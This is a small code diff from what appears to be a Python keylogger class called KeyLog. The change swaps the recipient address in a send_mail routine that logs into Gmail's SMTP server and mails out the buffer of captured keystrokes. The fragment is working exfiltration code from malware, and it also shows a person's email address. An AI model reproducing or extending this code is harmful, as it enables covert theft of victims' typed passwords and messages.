@@ -26,7 +26,7 @@ class KeyLog:
         server = smtplib.SMTP("smtp.gmail.com",587)
         server.starttls()
         server.login(email, password)
-        server.sendmail(email, "joseph.merigala@gmail.com", message)
+        server.sendmail(email, "src@gmail.com", message)
         server.quit()
     def report(self):
         self.send_mail(self.email, self.password, "\n\n"+self.buffer) # \n\n to skip `subject` field
